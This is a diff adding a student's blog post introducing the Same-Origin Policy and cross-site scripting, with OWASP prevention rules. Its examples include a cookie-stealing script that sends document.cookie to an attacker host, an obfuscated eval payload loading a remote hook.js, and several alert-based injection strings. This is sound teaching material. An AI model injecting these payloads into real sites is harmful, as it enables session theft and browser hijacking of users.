@@ -1,0 +1,1083 @@
+<!DOCTYPE html>
+<html lang="en-EN">
+  <head>
+    
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="msvalidate.01" content="2968909B8A7C9E7281129471CA8D69D9" />
+        <link rel="shortcut icon" href="/static/img/favicon.ico" />
+        <title>SOP and XSS introduction - Carlo Alberto Scola</title>
+        <meta name="author" content="Carlo Alberto Scola" />
+        <meta name="description" content="SOP and XSS introduction" />
+        <meta name="keywords" content="SOP and XSS introduction, Carlo Alberto Scola, notes" />
+
+        <meta content="1082525865223478" property="fb:app_id">
+        <meta content="Carlo Alberto Scola" property="og:site_name">
+        
+          <meta content="SOP and XSS introduction" property="og:title">
+        
+        
+          <meta content="article" property="og:type">
+        
+        
+          <meta content="Malicious scripts are executed by the victim's browser because the browser trusts the source of the content, even when it's not coming from where it seems to be coming from." property="og:description">
+        
+        
+          <meta content="https://carloalbertoscola.it//2018/notes/sop-xss-introduction/" property="og:url">
+        
+        
+          <meta content="2018-04-26T00:00:00+02:00" property="article:published_time">
+          <meta content="https://carloalbertoscola.it//about/" property="article:author">
+        
+        
+          <meta content="https://carloalbertoscola.it//static/img/logo-high-resolution.png" property="og:image">
+        
+        
+          
+          <meta content="notes" property="article:section">
+          
+        
+        
+          
+        
+        <meta name="twitter:card" content="summary">
+        <meta name="twitter:site" content="@bestrocker221">
+        <meta name="twitter:creator" content="@bestrocker221">
+        
+          <meta name="twitter:title" content="SOP and XSS introduction">
+        
+        
+          <meta name="twitter:url" content="https://carloalbertoscola.it//2018/notes/sop-xss-introduction/">
+        
+        
+          <meta name="twitter:description" content="Malicious scripts are executed by the victim's browser because the browser trusts the source of the content, even when it's not coming from where it seems to be coming from.">
+        
+        
+
+    
+      <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml">
+      <script type="text/javascript">window.baseurl = 'https://carloalbertoscola.it/';</script>
+      
+        <!-- Custom Fonts -->
+        <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Roboto:300,400,500,700" type="text/css">
+
+        <!-- FontAwesome icons -->
+        <!--<link rel="stylesheet" href="https://use.fontawesome.com/74dfc6cf47.css">-->
+        <link href="https://use.fontawesome.com/releases/v5.0.6/css/all.css" rel="stylesheet">
+
+
+        <!-- Core BootStrap CSS -->
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
+        
+        <!-- Material Design CSS -->
+        <link rel="stylesheet" href="/static/css/bootstrap-material-design.min.css">
+
+        <!-- syntax highlighting CSS -->
+        <link rel="stylesheet" href="/static/css/syntax.css">
+
+        <!-- Custom CSS -->        
+        <link rel="stylesheet" href="/static/css/thickbox.css">
+        <link rel="stylesheet" href="/static/css/main.css">
+        <link rel="stylesheet" href="/static/css/projects.css">
+
+        <script type="text/javascript">
+          //loadingImage is relative to project dir
+          var tb_pathToImage = "/static/img/loadingAnimation.gif";
+        </script>
+
+  </head>
+
+  <body class="home overflow-hidden">
+    <div class="header-panel shadow-z-2">
+      <div class="container">
+        <div class="row">
+          <div class="col-md-3 col-sm-4 col-xs-12">
+            <div class="row-picture">
+              <a href="/"><img id="about" class="logo-img" src="/static/img/avatar.jpg" height="75px" width="75px"></a>
+            </div>
+            <div class="row-details">
+              <h4 class="list-group-item-heading"><a href="/" style="color:white;">Carlo Alberto Scola</a></h4>
+              <p class="list-group-item-text">CS Student</p>
+              <div class="social-icons" style="display: initial !important;">
+	
+        <a class="icon" target="_blank" href="https://github.com/bestrocker221"><i class="fab fab fa-github" ></i></a>
+    
+        <a class="icon" target="_blank" href="https://www.linkedin.com/in/carlo-alberto-scola-75653b128/"><i class="fab fa-linkedin" ></i></a>
+    
+        <a class="icon" target="_blank" href="https://www.facebook.com/carloalberto.scola"><i class="fab fa-facebook" ></i></a>
+    
+        <a class="icon" target="_blank" href="https://twitter.com/bestrocker221"><i class="fab fa-twitter" ></i></a>
+    
+        <a class="icon" target="_blank" href="https://www.instagram.com/carlettoo_22/"><i class="fab fa-instagram" ></i></a>
+    
+</div>
+
+            </div>
+            <div class="navbar-header pull-right">
+              <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
+                <span class="sr-only">Toggle navigation</span>
+                <i class="fa fa-2x fa-bars"></i>
+              </button>
+            </div>
+          </div>
+          <div class="col-md-9 col-sm-8 col-xs-12">
+          <div class="row">
+            <h2 class="blog-title-pro col-md-8 col-sm-12 col-xs-12 ">SOP and XSS introduction</h2>
+            
+            <div class="col-md-4 col-sm-12 col-xs-12 searchcontrol" id="js-search">
+              <input class="form-control" type="text" id="js-search__input" placeholder="Search">
+              <ul class="search__results" id="js-search__results"></ul>
+            </div>
+            
+            </div>
+            <p class="info">
+              
+                <span class="time">26 Apr 2018</span>
+              
+              
+                <span class="categories">
+                  &raquo; categories:
+                  
+                    <a href="/category/notes">notes</a>
+                    
+                  
+                </span>
+              
+            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="container main outer">
+      <div class="row">
+        <div id="menu-div" class="col-md-3 col-xs-12 menu-div">
+              <nav class="menu">
+    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+    <ul class="list-separator nav navbar-nav well well-primary post">
+
+	
+	
+	
+	
+	
+	
+    
+	
+	<li class="col-lg-12 col-md-12 col-sm-4 col-xs-12 current-menu-item sop-xss-introduction"><a href="/" target="_self"><i class="fa fa-home"></i> Home</a></li>
+
+	
+	
+	
+	
+	
+	
+    
+	
+	<li class="col-lg-12 col-md-12 col-sm-4 col-xs-12  sop-xss-introduction"><a href="/linux" target="_self"><i class="fab fa-linux"></i> Linux</a></li>
+
+	
+	
+	
+	
+	
+	
+    
+	
+	<li class="col-lg-12 col-md-12 col-sm-4 col-xs-12  sop-xss-introduction"><a href="/security" target="_self"><i class="fas fa-lock"></i> Security</a></li>
+
+	
+	
+	
+	
+	
+	
+    
+	
+	<li class="col-lg-12 col-md-12 col-sm-4 col-xs-12  sop-xss-introduction"><a href="/web" target="_self"><i class="fas fa-globe"></i> Web</a></li>
+
+	
+	
+	
+	
+	
+	
+    
+	
+	<li class="col-lg-12 col-md-12 col-sm-4 col-xs-12  sop-xss-introduction"><a href="/notes" target="_self"><i class="fas fa-book"></i> Notes</a></li>
+
+	
+	
+	
+	
+	
+	
+    
+	
+	<li class="col-lg-12 col-md-12 col-sm-4 col-xs-12  sop-xss-introduction"><a href="/python" target="_self"><i class="fab fa-python"></i> Python</a></li>
+
+	
+	
+	
+	
+	
+	
+    
+	
+	<li class="col-lg-12 col-md-12 col-sm-4 col-xs-12  sop-xss-introduction"><a href="/photography" target="_self"><i class="fas fa-camera"></i> Photography</a></li>
+
+	
+	
+	
+	
+	
+	
+    
+	
+	<li class="col-lg-12 col-md-12 col-sm-4 col-xs-12  sop-xss-introduction"><a href="/about/" target="_self"><i class="fa fa-comments"></i> About</a></li>
+
+	
+	
+	
+	
+	
+	
+    
+	
+	<li class="col-lg-12 col-md-12 col-sm-4 col-xs-12  sop-xss-introduction"><a href="/projects" target="_self"><i class="fa fa-desktop"></i> Projects</a></li>
+
+	
+	
+	
+	
+	
+	
+    
+	
+	<li class="col-lg-12 col-md-12 col-sm-4 col-xs-12  sop-xss-introduction"><a href="/static/curriculum-vitae-eng-2.pdf" target="_blank"><i class="fa fa-graduation-cap"></i> Resume</a></li>
+
+</ul>
+
+    </div>
+    </nav>
+
+        </div>
+        <div class="col-md-9 col-xs-12 full">
+          <div class="post-content well">
+<article class="content">
+    <div class="post"><h1 id="same-origin-policy-and-cross-site-scripting-introduction">Same Origin Policy and Cross-Site-Scripting introduction</h1>
+<h2 id="what-is-an-xss-attack">What is an XSS Attack?</h2>
+<p>XSS attacks exploit the browser’s trust of the content received from the server. Malicious scripts are executed by the victim’s browser because the browser trusts the source of the content, even when it’s not coming from where it seems to be coming from.</p>
+
+<h2 id="what-is-covered-here">What is covered here:</h2>
+<ol>
+  <li><a href="#1-name-convenction">Name convenction</a></li>
+  <li><a href="#2-basic-browser-capabilities-and-vulnerability">Basic Browser capabilities and vulnerability</a></li>
+  <li><a href="#3-attack-methodology-in-short-">Attack methodology</a></li>
+  <li><a href="#4-useful-http-headers">Useful HTTP headers</a></li>
+  <li><a href="#5-same-origin-policy">Same-Origin-Policy</a></li>
+  <li><a href="#6-cross-site-scripting">Cross-Site-Scripting</a></li>
+  <li><a href="#7-xss-examples">XSS examples and testing</a></li>
+  <li><a href="#8-url-obfuscation">Obfuscation and encoding</a></li>
+  <li><a href="#9-owasp-xss-prevention-rules">OWASP Prevention</a></li>
+</ol>
+
+<h2 id="1-name-convenction">1. Name convenction</h2>
+
+<p>Some basic names to know:</p>
+
+<h3 id="dom-or-document-object-model">DOM or <em>Document Object Model</em></h3>
+<p>is the main model by which scripting languages like Javascript handle and modify the html or xml page. It is divided hierarchically with the root level being the <code class="highlighter-rouge"><span class="nt">&lt;html&gt;</span></code> tag.</p>
+<blockquote>
+  <p>It is an API for interacting with objects within HTML or XML documents.</p>
+</blockquote>
+
+<p><img src="https://bestrockers.ddns.net/res/dom.gif" alt="" /></p>
+
+<h3 id="rendering-engines">Rendering Engines</h3>
+<p>which includes <em>layout engines</em> and <em>web browser engines</em>.
+ They convert data into a format useful for presentation to the user on the screen, they combine HTML with CSS and images.</p>
+
+<ul>
+  <li>Webkit –&gt; Google Chrome</li>
+  <li>Trident –&gt; Microsoft</li>
+  <li>Gecko –&gt; Firefox</li>
+  <li>Presto –&gt; Opera</li>
+</ul>
+
+<p>#### Web Sockets
+ Browser method to open responsive, full duplex communication with a server. It is a replacement for AJAX technologies, and it is native in browsers.</p>
+
+<p>To see if a browser support websockets:</p>
+
+<p><code class="highlighter-rouge">return !!window.WebSocket || !!window.MozWebSocket;</code></p>
+
+<p>Ref -&gt; <a href="https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API">https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API</a></p>
+
+<h3 id="web-workers-or-browser-threads">Web Workers or “browser threads”</h3>
+<p>Given that Javascript run single threaded there are ways to achieve cuncurrency:</p>
+<ul>
+  <li>setTimeout(func, timeout);</li>
+  <li>setInterval(func, timeout);</li>
+</ul>
+
+<p>Browser threads run in background and there are two types:</p>
+<ul>
+  <li>shared across anything under the same origin</li>
+  <li>that communicate only back to its creator</li>
+</ul>
+
+<hr />
+<h2 id="2-basic-browser-capabilities-and-vulnerability">2. Basic Browser capabilities and vulnerability</h2>
+<h3 id="sandboxing">Sandboxing</h3>
+<p>The base assumption is that the browser in a way or another <strong>will be compromised</strong>. The sandbox is a mitigating control which can be applied at:</p>
+<ul>
+  <li><em>kernel level</em>: to separate one user from another</li>
+  <li><em>hardware level</em>: to separate privileges between kernel/user space</li>
+  <li><em>browser level</em>: (highest level) it is the barrier between privileges given to browser by OS and privileges of a subprocess running in the broser.</li>
+</ul>
+
+<p>To compromise the browser you need two steps:</p>
+
+<p><strong>find vuln in the browser</strong> –&gt; <strong>break through the sandbox</strong></p>
+
+<h3 id="extensions-and-plugins">Extensions and Plugins</h3>
+<p>augment browser capabilities but increase the <strong>attack surface</strong>.</p>
+
+<p>Plugins differs from extensions in the fact that they need <strong>to be included in the page</strong> with an object tag or content-type-header.</p>
+
+<h3 id="javascript-xmlhttprequest">Javascript: <em>XMLHttpRequest()</em></h3>
+<p>Use XMLHttpRequest (XHR) objects to interact with servers, retrieve data from a URL. Heavily used in Ajax. It supports other protocol than HTTP like <code class="highlighter-rouge">file</code> and <code class="highlighter-rouge">ftp</code>.</p>
+
+<p>Easy example:</p>
+<pre><code class="language-JavaScript"> function reqListener () {
+   console.log(this.responseText);
+ }
+
+ var oReq = new XMLHttpRequest();
+ oReq.onload = reqListener;
+ oReq.open("GET", "http://www.example.org/example.txt");
+ oReq.send();
+</code></pre>
+<p>ref:</p>
+<ul>
+  <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest">https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest</a></li>
+  <li><a href="https://developer.mozilla.org/it/docs/Web/API/XMLHttpRequest/Usare_XMLHttpRequest">https://developer.mozilla.org/it/docs/Web/API/XMLHttpRequest/Usare_XMLHttpRequest</a></li>
+</ul>
+
+<hr />
+
+<h2 id="3-attack-methodology-in-short">3. Attack methodology (in short)</h2>
+
+<p><img src="https://bestrockers.ddns.net/res/att-met.jpg" alt="" /></p>
+
+<ol>
+  <li><strong>Initiating</strong>: execute instructions on browser victim</li>
+  <li><strong>Retaining</strong>: you need to maintain control over time, the code need to continuously ask for your next wishes</li>
+  <li><strong>Attacking</strong>: you leverage control over the browser.</li>
+  <li><strong>Bypass the SOP</strong>: SOP is the primary sandbox. If you are able to bypass you have automatically created a succesfull attack, you can include resources from another origin.</li>
+  <li><strong>Attacking users</strong>: you can encourage users to enter compromising information by altering the page or granting privileges for arbitrary program or local resources.</li>
+  <li><strong>Attacking browser</strong>: you attack browser API and abstractions to store and recall data.</li>
+  <li><strong>Attacking extensions</strong>: exploiting extension could allow you to run OS commands or cross origin requests.</li>
+  <li><strong>Attacking Plugins</strong>: one of the most vulnerable area of the browser.</li>
+  <li><strong>Attacking web application</strong>:</li>
+  <li><strong>Attacking networks</strong>: connect to non standard ports</li>
+</ol>
+
+<hr />
+
+<h2 id="4-useful-http-headers">4. Useful HTTP Headers</h2>
+
+<p><a href="/notes/2018/04/26/http-header-security.html">Link here</a></p>
+
+<h2 id="5-same-origin-policy">5. Same-Origin-Policy</h2>
+
+<p>Fast example of how SOP block resource access.</p>
+
+<p><img src="https://bestrockers.ddns.net/res/sop.png" alt="" /></p>
+
+<p><em>test1.com</em> can’t access data of <em>bankofamerica.com</em> in the same browser.</p>
+
+<p>GET/POST requests can be made from one domain to *****. (all domain)</p>
+
+<p>GET/POST response can be read only if:</p>
+<ul>
+  <li>ports match</li>
+  <li>domain/subdomain match</li>
+  <li>protocol match</li>
+</ul>
+
+<p>on <strong>both sites</strong>.</p>
+
+<h4 id="exception">Exception</h4>
+
+<p>Two subdomain (different origin) under the same domain.</p>
+
+<p>Ex: <em>siteA.live.com</em> and <em>vulnerable.live.com</em></p>
+
+<ol>
+  <li><em>siteA.live.com</em> sets <code class="highlighter-rouge">document.domain = live.com</code></li>
+  <li><em>vulnerable.live.com</em> can set domain to “live.com” and access data of <em>siteA.live.com</em></li>
+</ol>
+
+<p><strong>Cross Sub-Domain communication</strong>  or <strong>Domain Lowering</strong> or <strong>Putting all the eggs in one basket</strong></p>
+
+<h3 id="same-origin-for-cookies">Same origin for COOKIES</h3>
+
+<p>By default cookies permit read/write access if the domain is the same but:</p>
+
+<ul>
+  <li>No port number check</li>
+  <li>No scheme check</li>
+</ul>
+
+<p><em>vuln.live.com</em> can poison cookies of <em>live.com</em></p>
+
+<p><em>vuln.live.com:1111</em> can poison cookies of <em>live.com:2222</em></p>
+
+<p>So? Ports are not a security boundary. Different web app on different port should be avoided.</p>
+
+<p>Need <strong>cross domain</strong> requests? use <strong>CORS</strong>.</p>
+
+<p>Cross-domain GET/POST can easily introduce <strong>CSRF</strong>.</p>
+
+<hr />
+
+<h2 id="6-cross-site-scripting">6. Cross-Site-Scripting</h2>
+
+<h3 id="how-is-the-malicius-js-injected">How is the malicius js injected?</h3>
+<p>The attacker inject the code into the pages that victim downloads from the website. Example if the <strong>user input is directly included</strong> in the output.</p>
+
+<p>Example: (SSI)</p>
+<div class="language-html highlighter-rouge"><pre class="highlight"><code>print "<span class="nt">&lt;html&gt;</span>"
+print "Latest comment:"
+print database.latestComment
+print "<span class="nt">&lt;/html&gt;</span>"
+</code></pre>
+</div>
+
+<p>If user supply “<code class="highlighter-rouge">&lt;script&gt;...&lt;/script&gt;</code>” as a comment (under a post i.e) the output will be:</p>
+
+<div class="language-html highlighter-rouge"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+Latest comment:
+<span class="nt">&lt;script&gt;</span><span class="p">...</span><span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre>
+</div>
+
+<p>and will be executed in the browser victim.</p>
+
+<p>This is what is called <strong>Persistent XSS</strong> or <strong>Stored XSS</strong> because an attacker has been able to inject some code directly into the data storage of the application (database). This results in serving the code to whoever is watching the page without further actions by the attacker.</p>
+
+<p>Let’s see another example.</p>
+
+<p>This is a server side PHP script</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
+<span class="cp">?&gt;</span>
+</code></pre>
+</div>
+
+<p>if a client requests “<code class="highlighter-rouge">http://example.com?id=&lt;script&gt;alert("hello");&lt;/script&gt;</code>”
+the output will be .. ?</p>
+
+<p>Another input could be <code class="highlighter-rouge">?id=&lt;iframe%20src=http://attacker.com/&gt;&lt;/iframe&gt;</code>. When rendered this would include an iframe to the attacker server page.</p>
+
+<p>This is a simple example of <strong>Reflected Cross-Site Scripting</strong>.</p>
+
+<h4 id="dom-based-xss">DOM-based XSS</h4>
+
+<p>Is purely client-side. The HTTP response doesn’t change.</p>
+
+<ol>
+  <li>The attacker crafts a URL containing a malicious string and sends it to the victim.</li>
+  <li>The victim is tricked by the attacker into requesting the URL from the website.</li>
+  <li>The website receives the request, but does not include the malicious string in the response.</li>
+  <li>The victim’s browser executes the legitimate script inside the response, causing the malicious script to be inserted into the page.</li>
+  <li>The victim’s browser executes the malicious script inserted into the page, sending the victim’s cookies to the attacker’s server.</li>
+</ol>
+
+<p><img src="https://bestrockers.ddns.net/res/dom-based-xss.png" alt="" /></p>
+
+<p>In DOM-based XSS, the malicious JavaScript is executed at some point after the page has loaded, as a result of the page’s legitimate JavaScript treating user input in an unsafe way.</p>
+
+<p>DOM-based XSS are <strong>invisible to server</strong>. If the malicious string is contained in a URL fragment identifier (after <strong>#</strong> ) then that part of URL will <strong>never leave the browser</strong>.</p>
+
+<p>Other user input that is invisible to the server includes new HTML5 features like <em>LocalStorage</em> and <em>IndexedDB</em>.</p>
+
+<p>In more secure scenarios there will be a <strong>WAF</strong> or <em>Web Application Firewall</em> configured to match XSS payloads and block the request.</p>
+
+<h3 id="what-is-the-aim-of-malicious-javascript">What is the aim of malicious Javascript?</h3>
+
+<ul>
+  <li><strong>Cookie theft</strong>: cookies are the most common mechanism for authentication and state maintainment under multiple HTTP requests. If an attacker is able to retrieve a cookie for an authorized client, he could impersonate him.</li>
+  <li><strong>Keylogging</strong>: an event listener can be registered and every input can be sent to the attacker’s own server. It is as simple as an <em>addEventListener</em>.</li>
+  <li><strong>Phishing</strong>: fake form login, DOM manipulation</li>
+</ul>
+
+<h3 id="example-attack-scenario">Example attack scenario</h3>
+<p>If a website has low security policy (no CSP, no XSS, no secure Cookie) the simplest way to thieve a cookie is to make a request to the attacker’s own server.</p>
+
+<p><code class="highlighter-rouge">&lt;script&gt;
+window.location='http://attacker/?cookie='+document.cookie
+&lt;/script&gt;</code></p>
+
+<p>Scenario:</p>
+<ul>
+  <li>Ada is connected to a website vulnerable of Stored XSS</li>
+  <li>The page is loaded and the script is executed into the Ada Browser</li>
+  <li>Ada makes a request to another origin including cookies from the actual origin.</li>
+  <li>Attacker get Ada’s cookie logged.</li>
+</ul>
+
+<p>No security was in place.</p>
+
+<ul>
+  <li>No user sanitization on Comment management.</li>
+  <li>Cookie HttpOnly flag not used.</li>
+</ul>
+
+<h2 id="7-xss-examples">7. XSS Examples</h2>
+
+<p>HTML based</p>
+
+<ul>
+  <li><code class="highlighter-rouge">&lt;body onload=alert('test1')&gt;</code></li>
+  <li><code class="highlighter-rouge">&lt;b onmouseover=alert('Wufff!')&gt;click me!&lt;/b&gt;</code></li>
+  <li><code class="highlighter-rouge">&lt;img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);&gt;</code></li>
+</ul>
+
+<p>Script Via Encoded URI Schemes</p>
+
+<p><code class="highlighter-rouge">&lt;IMG SRC=j&amp;#X41vascript:alert('test2')&gt;</code></p>
+
+<p>code encoding</p>
+
+<p><code class="highlighter-rouge">&lt;META HTTP-EQUIV="refresh"
+CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg"&gt;</code></p>
+
+<p>cookie theft</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>&lt;SCRIPT type="text/javascript"&gt;
+var adr = '../evil.php?cakemonster=' + escape(document.cookie);
+&lt;/SCRIPT&gt;
+</code></pre>
+</div>
+
+<h3 id="how-to-contrast-xss">How to contrast XSS</h3>
+<p>XSS is a type of <strong>code injection</strong> –&gt; input must be secured.
+You MUST use the escape syntax for the part of the HTML document you’re putting untrusted data into.</p>
+
+<ul>
+  <li><strong>Encoding</strong>: escape user input</li>
+  <li><strong>Validation</strong>: filter input from malicious commands</li>
+</ul>
+
+<p>Input context:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Context</th>
+      <th>Example</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>HTML element content</td>
+      <td><code class="highlighter-rouge">&lt;div&gt;userInput&lt;/div&gt;</code></td>
+    </tr>
+    <tr>
+      <td>HTML attribute value</td>
+      <td><code class="highlighter-rouge">&lt;input value="userInput"&gt;</code></td>
+    </tr>
+    <tr>
+      <td>URL query value</td>
+      <td><code class="highlighter-rouge">http://example.com/?parameter=userInput</code></td>
+    </tr>
+    <tr>
+      <td>CSS value</td>
+      <td><code class="highlighter-rouge">color: userInput</code></td>
+    </tr>
+    <tr>
+      <td>JavaScript value</td>
+      <td><code class="highlighter-rouge">var name = "userInput";</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>If user input is inserted directly into the HTML then:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Application code</th>
+      <th><code class="highlighter-rouge">&lt;input value="userInput"&gt;</code></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Malicious String</strong></td>
+      <td><code class="highlighter-rouge">"&gt;&lt;script&gt;...&lt;/script&gt;&lt;input value="</code></td>
+    </tr>
+    <tr>
+      <td><strong>Result</strong></td>
+      <td><code class="highlighter-rouge">&lt;input value=""&gt;&lt;script&gt;...&lt;/script&gt;&lt;input value=""&gt;</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>To avoid this, just <strong>sanitize input</strong> (client and server side), and remove quotation marks.</p>
+
+<h3 id="encoding">Encoding</h3>
+<p>Encoding is the act of <strong>escaping</strong> user input so that the browser interprets it only as data, not as code.</p>
+
+<p>Ex: HTML escaping, which converts characters like <code class="highlighter-rouge">&lt;</code> and <code class="highlighter-rouge">&gt;</code> into <code class="highlighter-rouge">&amp;lt;</code> and <code class="highlighter-rouge">&amp;gt;</code>.</p>
+
+<p><code class="highlighter-rouge">&lt;script&gt;...&lt;/script&gt;</code> would become <code class="highlighter-rouge">&amp;lt;script&amp;gt;...&amp;lt;/script&amp;gt;</code></p>
+
+<p>JavaScript encodeURIComponent():</p>
+
+<div class="language-javascript highlighter-rouge"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">uri</span> <span class="o">=</span> <span class="s2">"https://w3schools.com/my test.asp?name=ståle&amp;car=saab"</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">res</span> <span class="o">=</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">uri</span><span class="p">);</span>
+</code></pre>
+</div>
+<p>results in:</p>
+
+<p><code class="highlighter-rouge">https%3A%2F%2Fw3schools.com%2Fmy%20test.asp%3Fname%3Dst%C3%A5le%26car%3Dsaab</code></p>
+
+<h3 id="validation">Validation</h3>
+<p>Allow some HTML elements (such as <code class="highlighter-rouge">&lt;em&gt;</code> and <code class="highlighter-rouge">&lt;strong&gt;</code>) but disallowing others (such as <code class="highlighter-rouge">&lt;script&gt;</code>).</p>
+
+<h2 id="8-url-obfuscation">8. URL Obfuscation</h2>
+
+<ul>
+  <li>URL shortener</li>
+  <li>URL redirector</li>
+  <li>URL/ASCII Encoding</li>
+  <li>adding extra irrilevant query parameter</li>
+  <li>converting domain into an integer –&gt; http://4231939341</li>
+</ul>
+
+<p>Example:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>http://browservictim.com/page.html?id=1');eval(String.fromCharCode(115,
+61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,10
+9,101,110,116,40,39,115,99,114,105,112,116,39,41,59,115,46,115,114,99,61
+,39,104,116,116,112,58,47,47,98,114,111,119,115,101,114,104,97,99,107,10
+1,114,46,99,111,109,47,104,111,111,107,46,106,115,39,59,100,111,99,117,1
+09,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,9
+7,103,78,97,109,101,40,39,104,101,97,100,39,41,91,48,93,46,97,112,112,10
+1,110,100,67,104,105,108,100,40,115,41,59))//
+</code></pre>
+</div>
+
+<p>will be interpreted in</p>
+
+<p><code class="highlighter-rouge">http://browservictim.com/page.html?id=1');s=document.createElement('script');s.src='http://browserhacker.com/hook.js';document.getElementsByTagName('head')[0].appendChild(s);</code></p>
+
+<p>thanks to the use of <strong><code class="highlighter-rouge">eval</code></strong> and <strong><code class="highlighter-rouge">String.fromCharCode</code></strong>.</p>
+
+<hr />
+
+<h2 id="9-owasp-xss-prevention-rules">9. OWASP XSS Prevention rules</h2>
+
+<ul>
+  <li><strong>Never Insert Untrusted Data Except in Allowed Locations</strong>: deny all, don’t put untrusted data into HTML document/tag  and nested contexts. Example:</li>
+</ul>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>&lt;script&gt;...NEVER PUT UNTRUSTED DATA HERE...&lt;/script&gt;   directly in a script
+&lt;!--...NEVER PUT UNTRUSTED DATA HERE...--&gt;             inside an HTML comment
+&lt;div ...NEVER PUT UNTRUSTED DATA HERE...=test /&gt;       in an attribute name
+&lt;NEVER PUT UNTRUSTED DATA HERE... href="/test" /&gt;   in a tag name
+&lt;style&gt;...NEVER PUT UNTRUSTED DATA HERE...&lt;/style&gt;   directly in CSS
+</code></pre>
+</div>
+
+<ul>
+  <li><strong>HTML Escape Before Inserting Untrusted Data into HTML Element Content</strong></li>
+</ul>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>&lt;body&gt;...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...&lt;/body&gt;
+&lt;div&gt;...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...&lt;/div&gt;
+</code></pre>
+</div>
+
+<p>Escape the following characters with HTML entity encoding:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>&amp; --&gt; &amp;amp;
+&lt; --&gt; &amp;lt;
+&gt; --&gt; &amp;gt;
+" --&gt; &amp;quot;
+' --&gt; &amp;#x27;
+/ --&gt; &amp;#x2F;
+</code></pre>
+</div>
+
+<ul>
+  <li><strong>Attribute Escape Before Inserting Untrusted Data into HTML Common Attributes</strong>:is for putting untrusted data into typical attribute values like width, name, value, etc</li>
+</ul>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>&lt;div attr="...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE..."&gt;content&lt;/div&gt;   inside double quoted attribute
+</code></pre>
+</div>
+
+<p>Escape all characters with ASCII values less than 256 with the &amp;#xHH; format</p>
+
+<ul>
+  <li><strong>JavaScript Escape Before Inserting Untrusted Data into JavaScript Data Values</strong>: for dynamically generated JavaScript code</li>
+</ul>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>&lt;script&gt;x='...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...'&lt;/script&gt;          one side of a quoted expression
+&lt;div onmouseover="x='...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...'"&lt;/div&gt;  inside quoted event handler
+</code></pre>
+</div>
+
+<p>Some JavaScript functions can never safely use untrusted data as input - EVEN IF JAVASCRIPT ESCAPED!</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>&lt;script&gt;
+window.setInterval('...EVEN IF YOU ESCAPE UNTRUSTED DATA YOU ARE XSSED HERE...');
+ &lt;/script&gt;
+</code></pre>
+</div>
+
+<ul>
+  <li><strong>CSS Escape And Strictly Validate Before Inserting Untrusted Data into HTML Style Property Values</strong>: You should stay away from putting untrusted data into complex properties like url, behavior, and custom (-moz-binding)</li>
+</ul>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>&lt;style&gt;selector { property : "...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE..."; } &lt;/style&gt;   property value
+&lt;span style="property : ...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE..."&gt;text&lt;/span&gt;       property value
+</code></pre>
+</div>
+
+<p>Example:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code><span class="p">{</span><span class="w"> </span><span class="err">background-url</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="nt">"javascript:alert(1)"</span><span class="err">;</span><span class="w"> </span><span class="err">}</span><span class="w">  </span><span class="err">//</span><span class="w"> </span><span class="err">and</span><span class="w"> </span><span class="err">all</span><span class="w"> </span><span class="err">other</span><span class="w"> </span><span class="err">URLs</span><span class="w">
+</span><span class="p">{</span><span class="w"> </span><span class="err">text-size:</span><span class="w"> </span><span class="nt">"expression(alert('XSS'))"</span><span class="err">;</span><span class="w"> </span><span class="err">}</span><span class="w">   </span><span class="err">//</span><span class="w"> </span><span class="err">only</span><span class="w"> </span><span class="err">in</span><span class="w"> </span><span class="err">IE</span><span class="w">
+</span></code></pre>
+</div>
+
+<ul>
